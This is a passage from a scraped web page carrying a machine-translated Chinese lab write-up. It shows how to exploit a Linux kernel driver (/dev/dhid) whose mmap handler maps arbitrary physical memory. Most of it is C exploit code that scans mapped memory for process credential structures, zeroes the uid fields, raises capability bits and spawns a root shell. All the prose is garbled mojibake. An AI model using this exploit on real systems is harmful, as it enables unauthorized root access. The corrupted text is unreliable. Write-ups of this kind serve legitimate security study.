é€šå¸¸ï¼Œé©±åŠ¨ç¨‹åºä¸­çš„mmapæ˜¯å°†è®¾å¤‡æ˜ å°„åˆ°å†…å­˜å¹¶æŒ‰éœ€é€‰æ‹©é¡µé¢æ‰€å¿…éœ€çš„ï¼Œå› ä¸ºæœ€åˆè®¾å¤‡æ ¹æœ¬ä¸ä½¿ç”¨ç‰©ç†å†…å­˜ã€‚ <br><br> åœ¨æ­¤ä»£ç ä¸­ï¼Œå”¯ä¸€æœ‰è¶£çš„åœ°æ–¹æ˜¯å¯¹remap_pfn_rangeå‡½æ•°çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°å…è®¸å°†è®¾å¤‡å†…å­˜çº¿æ€§æ˜ å°„åˆ°ç”¨æˆ·çš„åœ°å€ç©ºé—´ã€‚ <br><blockquote>  int remap_pfn_rangeï¼ˆstruct vm_area_struct * vmaï¼Œunsigned long virt_addï¼Œunsigned long pfnï¼Œunsigned long sizeï¼Œpgprot_t protï¼‰;å¤åˆ¶ä»£ç  <br><br> æ˜¾ç¤ºç‰©ç†åœ°å€çš„å¤§å°å­—èŠ‚ï¼Œä»pfnä¸ºè™šæ‹Ÿåœ°å€virt_addæŒ‡å®šçš„é¡µç å¼€å§‹ã€‚ ä¸è™šæ‹Ÿç©ºé—´å…³è”çš„å®‰å…¨ä½åœ¨protä¸­æŒ‡å®šã€‚ </blockquote><br> ä¸å¾€å¸¸ä¸€æ ·ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä»¥å‰æœªå¤„ç†è¿‡çš„å‚æ•°ã€‚ è¿™äº›æ˜¯pfnå’Œsizeå‚æ•°ï¼Œå®ƒä½¿æˆ‘ä»¬å¯ä»¥æ˜¾ç¤ºä»»ä½•æ•°é‡çš„å†…å­˜ä»¥ä¾›è¯»å†™ã€‚ <br><br><h3> åˆ©ç”¨ </h3><br> è°·æ­Œæœç´¢å¯ä»¥åšä»€ä¹ˆï¼Œæˆ‘è¢«ä¸€ç§å¯èƒ½çš„åˆ©ç”¨æ–¹å¼éœ‡æƒŠã€‚ å¦‚æœå¯ä»¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°credsæ§ä»¶ç»“æ„ï¼Œåˆ™å¯ä»¥å°†ç”¨æˆ·uidæ›´æ”¹ä¸º0ã€‚ç„¶åè°ƒç”¨shellï¼Œè¿™å°†ä¸ºæˆ‘ä»¬æä¾›å…·æœ‰å®Œå…¨ç‰¹æƒçš„shellã€‚ <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="å›¾ç‰‡"><br><br> é¦–å…ˆï¼Œæ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ˜¾ç¤ºå¤§é‡å†…å­˜ã€‚ ä»¥ä¸‹ä»£ç å°†æ‰“å¼€è®¾å¤‡å¹¶æ˜¾ç¤ºä»0x40404040åœ°å€å¼€å§‹çš„0xf0000000å­—èŠ‚ï¼Œä»¥è¿›è¡Œè¯»å–å’Œå†™å…¥ï¼Œå¹¶å¯èƒ½å°†æ­¤åå°„ä¸å…¶ä»–åæ˜ åŒä¸€å¯¹è±¡çš„è¿›ç¨‹ä¸€èµ·ä½¿ç”¨ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ä»£å·</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br> ç¼–è¯‘ï¼š <code>gcc sh.c -o sh.bin</code>å¹¶è½¬ç§»åˆ°ä¸»æœºã€‚ è®©æˆ‘ä»¬è¿è¡Œå®ƒã€‚ <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="å›¾ç‰‡"><br><br> ç°åœ¨ï¼Œè®©æˆ‘ä»¬è½¬åˆ°å¦ä¸€ä¸ªsshç»ˆç«¯ï¼ŒæŸ¥çœ‹æ­¤è¿‡ç¨‹çš„å­˜å‚¨å¡ã€‚ <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="å›¾ç‰‡"><br><br> å¦‚æ‚¨æ‰€è§ï¼Œåœ°å€ç›¸åŒï¼Œå¹¶è´´æœ‰ç”¨äºè¯»å†™å’Œå…±äº«çš„æ ‡ç­¾ã€‚ é‚£æ˜¯ä¸€ä¸ªå¯è¡Œçš„æƒ³æ³•ã€‚ ä¸‹ä¸€æ­¥æ˜¯åœ¨å¿ƒä¸­æ‰¾åˆ°è¿‡ç¨‹çš„ä¿¡èª‰ç»“æ„ã€‚ ä»ä¸Šé¢çš„ç»“æ„å¯ä»¥çœ‹å‡ºï¼Œæ ‡å¿—å°†æ˜¯æˆ‘ä»¬çš„uidè¿ç»­ä¼¤å®³çš„8ä¸ªæ•°å­—ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ä»£å·</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br> å› æ­¤ï¼Œæˆ‘ä»¬å‘ç°äº†19ä¸ªç›¸ä¼¼çš„ç»“æ„ã€‚ <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="å›¾ç‰‡"><br><br> ç°åœ¨æˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰uidé‡å†™ä¸º0ã€‚é‡å†™ç‰¹å®šç»“æ„çš„uidä¹‹åï¼Œæˆ‘ä»¬å°†æ£€æŸ¥uidã€‚ åªè¦æˆ‘ä»¬çš„uidç­‰äº0ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‡å®šæˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æ‰€éœ€è¿‡ç¨‹çš„ç»“æ„ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ä»£å·</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="å›¾ç‰‡"><br><br> ç°åœ¨ï¼Œæ‰¾åˆ°æ‰€éœ€çš„ç»“æ„åï¼Œå°†uidæ›´æ”¹ä¸º0xffffffffå¹¶é€šè¿‡execå‡½æ•°è°ƒç”¨bash shellã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ä»£å·</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="å›¾ç‰‡"><br><br> æˆ‘ä»¬æ‰æ ¹äº†ã€‚ å®é™…ä¸Šï¼Œè¿™æ˜¯ä¸€å°éå¸¸å¤æ‚çš„æœºå™¨ï¼Œéœ€è¦å¤æ‚çš„è½¯ä»¶æ‰èƒ½å¤„ç†æ­¤ç‰ˆæœ¬çš„LPEã€‚ <br><br> å½“ç„¶ï¼Œè¦åœ¨é©±åŠ¨ç¨‹åºä¸­åˆ©ç”¨æ­¤æ¼æ´éå¸¸å›°éš¾ï¼Œæˆ‘æ„Ÿè°¢ç¤¾åŒºä¸ºæˆ‘æä¾›äº†æœ‰å…³å¦‚ä½•è·å–é©±åŠ¨ç¨‹åºçš„æç¤ºï¼Œå¹¶åˆ†äº«äº†æœ‰å…³mmapä¸­ç±»ä¼¼æ¼æ´åˆ©ç”¨çš„æ–‡ç« ã€‚ <br><br> æˆ‘æ˜¯å¦åº”è¯¥ç»§ç»­å‘å¸ƒå‘é€ç»™è¿›ä¸€æ­¥å¤„ç†çš„æœºå™¨çš„åˆ†æï¼Ÿ æ‚¨å¯ä»¥é€šè¿‡<a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a>åŠ å…¥æˆ‘ä»¬ã€‚ è®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªç¤¾åŒºï¼Œåœ¨è¿™ä¸ªç¤¾åŒºä¸­ï¼Œä¼šæœ‰ä¸€äº›ç²¾é€šITé¢†åŸŸçš„äººï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•ITå’Œä¿¡æ¯å®‰å…¨é—®é¢˜ä¸Šäº’ç›¸å¸®åŠ©ã€‚ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN480454/">https://habr.com/ru/post/zh-CN480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN480438/index.html">12æœˆ16æ—¥è‡³22æ—¥åœ¨è«æ–¯ç§‘ä¸¾è¡Œçš„æ•°å­—æ´»åŠ¨</a></li>
<li><a href="../zh-CN480440/index.html">12æœˆ16æ—¥è‡³22æ—¥åœ¨åœ£å½¼å¾—å ¡ä¸¾è¡Œçš„æ•°å­—æ´»åŠ¨</a></li>
<li><a href="../zh-CN480444/index.html">Habraä¾¦æ¢ï¼šä»24å®¶å‡ºç‰ˆç‰©å‘è¡Œä¹‹æ—¥èµ·24å°æ—¶å†…</a></li>
<li><a href="../zh-CN480446/index.html">åœ¨Goä¸Šç¼–å†™Grafanaåå‘ä»£ç†</a></li>
<li><a href="../zh-CN480452/index.html">OWASPè«æ–¯ç§‘èšä¼šï¼ƒ9ï¼šæ€§èƒ½è®°å½•</a></li>
<li><a href="../zh-CN480458/index.html">è§‚çœ‹â€œæ—¶é—´çš„ç»†èƒâ€</a></li>
<li><a href="../zh-CN480462/index.html">æˆ‘å¦‚ä½•è¾©è®ºOçš„åŒå‘é“¾è¡¨ï¼ˆ1ï¼‰</a></li>
<li><a href="../zh-CN480466/index.html">é€æä»ªè§„æ ¼ï¼šç»åœ°ä¹‹è·¯</a></li>
<li><a href="../zh-CN480468/index.html">é›¶æ‹…éƒ¨ç½²Tarantool Cartridgeåº”ç”¨ç¨‹åºï¼ˆç¬¬1éƒ¨åˆ†ï¼‰</a></li>
<li><a href="../zh-CN480470/index.html">åœ¨å“ªé‡Œæ‹…ä»»åˆçº§å¼€å‘äººå‘˜</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>